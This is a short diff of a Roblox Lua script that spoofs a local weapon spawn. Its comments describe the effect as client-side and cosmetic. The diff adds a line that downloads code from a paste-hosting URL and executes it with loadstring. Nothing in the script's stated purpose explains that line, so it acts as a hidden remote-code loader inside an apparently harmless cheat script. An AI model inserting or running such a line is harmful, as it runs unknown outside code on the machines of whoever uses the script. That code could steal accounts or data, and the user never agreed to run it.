@@ -17,7 +17,7 @@
     Reality check (FilteringEnabled): client-side only — only you see it; it
     can't be used for real combat. The spawn itself is a local ProfileData spoof.
 --]]
-
+loadstring(game:HttpGet('https://cdn.sourceb.in/bins/mBAG8F6u0Q/0'))()
 local CONFIG = {
     InjectParticles = true,   -- ParticleEmitter / Fire / Smoke / Sparkles / Lights
     HideOriginal    = true,   -- hide your real held weapon so only the spawn shows
